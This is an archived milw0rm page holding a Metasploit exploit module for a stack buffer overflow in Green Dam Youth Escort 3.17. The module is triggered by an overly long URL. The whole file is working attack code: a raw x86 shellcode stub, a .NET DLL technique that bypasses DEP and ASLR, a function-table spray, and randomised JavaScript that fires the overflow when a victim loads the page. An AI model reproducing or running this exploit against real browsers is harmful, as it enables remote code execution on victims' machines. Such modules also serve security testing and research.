<html><head><title>Green Dam 3.17 URL Processing Buffer Overflow Exploit (meta)</title></head><pre>##
# greendam_url.rb
#
# Green Dam URL Processing Buffer Overflow exploit for the Metasploit Framework
#
# Green Dam Youth Escort 3.17 successfully exploited on the following platforms:
#  - Internet Explorer 6, Windows XP SP2
#  - Internet Explorer 7, Windows XP SP3
#  - Internet Explorer 7, Windows Vista SP1
# 
# .NET binary is used to bypass DEP and ASLR
#
# Trancer
# http://www.rec-sec.com
##

require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           =&gt; 'Green Dam URL Processing Buffer Overflow',
			'Description'    =&gt; %q{
				This module exploits a stack-based buffer overflow in Green Dam Youth Escort   
				version 3.17 in the way it handles overly long URLs.
				By setting an overly long URL, an attacker can overrun a buffer and execute 
				arbitrary code. This module uses the .NET DLL memory technique by Alexander 
				Sotirov and Mark Dowd and should bypass DEP, NX and ASLR.
			},
			'License'        =&gt; MSF_LICENSE,
			'Author'         =&gt; [ 'Trancer &lt;mtrancer[at]gmail.com&gt;' ], 
			'Version'        =&gt; '$Revision:$',
			'References'     =&gt; 
				[
					['URL', 'http://www.cse.umich.edu/~jhalderm/pub/gd/'],		# Analysis of the Green Dam Censorware System
					['URL', 'http://www.milw0rm.com/exploits/8938'],		# Original exploit by seer[N.N.U]
					['URL', 'http://taossa.com/archive/bh08sotirovdowd.pdf'],	# .NET DLL memory technique
				],
			'DefaultOptions' =&gt;
				{
					'EXITFUNC' =&gt; 'process',
				},
			'Payload'        =&gt;
				{
					'Space'    =&gt; 1000,
					'BadChars' =&gt; &quot;\x00&quot;,
					'Compat'   =&gt; 
						{
							'ConnectionType' =&gt; '-find',
						},
					'StackAdjustment' =&gt; -3500,
					
					# Temporary stub virtualalloc() + memcpy() payload to RWX page
					'PrependEncoder' =&gt;
						&quot;\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c&quot;+
						&quot;\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32&quot;+
						&quot;\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07&quot;+
						&quot;\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24&quot;+
						&quot;\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8&quot;+
						&quot;\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64&quot;+
						&quot;\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x54&quot;+
						&quot;\xca\xaf\x91\xff\xd6\x6a\x40\x5e\x56\xc1\xe6\x06\x56\xc1\xe6\x08&quot;+
						&quot;\x56\x6a\x00\xff\xd0\x89\xc3\xeb\x0d\x5e\x89\xdf\xb9\xe8\x03\x00&quot;+
						&quot;\x00\xfc\xf3\xa4\xff\xe3\xe8\xee\xff\xff\xff&quot;
				},
			'Platform'       =&gt; 'win',
			'Targets'        =&gt;
				[
					[ 'Windows XP SP0-SP3 / Windows Vista SP0-SP1 / IE 6.0 SP0-2 &amp; IE 7.0', { }],
				],
			'DisclosureDate' =&gt; 'Jun 11 2009',
			'DefaultTarget'  =&gt; 0))
	end

	def on_request_uri(cli, request)
	
		ibase = 0x24240000
		vaddr = ibase + 0x2065

		if (request.uri.match(/\.dll$/i))

			print_status(&quot;Sending DLL to #{cli.peerhost}:#{cli.peerport}...&quot;)

			return if ((p = regenerate_payload(cli)) == nil)
	
			# First entry points to the table of pointers
			vtable  = [ vaddr + 4 ].pack(&quot;V&quot;)
			cbase   = ibase + 0x2065 + (256 * 4)

			# Build a function table
			255.times { vtable &lt;&lt; [cbase].pack(&quot;V&quot;) }

			# Append the shellcode
			vtable &lt;&lt; p.encoded
			send_response(
				cli, 
				Rex::Text.to_dotnetmem(ibase, vtable), 
				{
					'Content-Type' =&gt; 'application/x-msdownload',
					'Connection'   =&gt; 'close',
					'Pragma'       =&gt; 'no-cache'
				}
			)
			return
		end

		print_status(&quot;Sending HTML to #{cli.peerhost}:#{cli.peerport}...&quot;)

		j_function	= rand_text_alpha(rand(100)+1)
		j_url		= rand_text_alpha(rand(100)+1)
		j_counter	= rand_text_alpha(rand(30)+2)

		html = %Q|&lt;html&gt;
&lt;head&gt;
&lt;script language=&quot;javascript&quot;&gt;
	function #{j_function}() {
		var #{j_url}='';
		for(var #{j_counter}=1;#{j_counter}&lt;=2035;#{j_counter}++)
			#{j_url}+='$';

		window.location=#{j_url}+'.html';
	}	
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload=&quot;#{j_function}()&quot;&gt;
	&lt;object classid=&quot;#{get_resource + &quot;/generic-&quot; + Time.now.to_i.to_s + &quot;.dll&quot;}#GenericControl&quot;&gt;
	&lt;object&gt;
&lt;/body&gt;
&lt;/html&gt;
		|

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' =&gt; 'text/html' })
		
		# Handle the payload
		handler(cli)
	end
end

# milw0rm.com [2009-06-16]</pre></html>